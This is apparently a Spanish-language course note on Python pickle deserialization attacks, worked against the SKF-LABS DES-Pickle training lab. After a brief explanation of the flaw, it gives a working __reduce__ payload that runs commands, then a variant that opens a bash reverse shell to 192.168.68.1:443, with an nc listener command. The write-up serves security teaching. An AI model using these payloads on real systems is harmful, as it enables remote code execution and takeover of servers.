# Python – Ataque de Deserialización Pickle (DES-Pickle)

Tags: #Des-Pickle #OWASP #Explotacion 

Un Ataque de **Deserialización Pickle** (**DES-Pickle**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

El impacto de un Ataque de Deserialización Pickle depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren de forma adecuada la entrada Pickle que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.

A continuación, se os proporciona el enlace al proyecto de Github el cual estaremos utilizando en esta clase para explotar la vulnerabilidad DES-Pickle:

- **SKF-LABS DES-Pickle**: [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle)


## DES - PICKLE

Tenemos este laboratorio para practicar esta vulnerabilidad. 

![](Pasted%20image%2020230528175733.png)


Para poder hacer este tipo de ataques, debemos de crearnos un archivo Python en donde colocaremos lo siguiente:

```python
import pickle
import os
import binascii


class Exploit(object):
	def __reduce__(self):
		return (os.system, ('id',))

if __name__ == '__main__':
	print(binascii.hexlify(pickle.dumps(Exploit())))  
```

![](Pasted%20image%2020230528181048.png)

Si ejecutamos eso así nos saldrá una cadena de Bytes y nosotros necesitamos una cadena de Hexadecimal. Por lo que agregamos al final 'binascii.hexlify' 

![](Pasted%20image%2020230528181305.png)

Esa cadena ya la podemos colocar en la entrada de la pagina web. 

* Ahora si queremos ganar acceso a la maquina, lo que deberíamos de hacer es lo siguiente. 

```bash 
❯ nc -nlvp 443    # Ponernos en ecucha por el puerto 443 de nuestra maquina de atacante
```

```python
import pickle
import os
import binascii


class Exploit(object):
	def __reduce__(self):
		return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.68.1/443 0>&1"',))

if __name__ == '__main__':
	print(binascii.hexlify(pickle.dumps(Exploit())))  
```

Lo volvemos a convertir y lo pegamos en la web. 

![](Pasted%20image%2020230528181649.png)

![](Pasted%20image%2020230528181718.png)

Al momento de darle 'Submit' podremos ganar acceso a la maquina victima. 

Cabe mencionar que esto se logra ya que no existe algún tipo de deserialización y se esta confiando en el input del usuario.  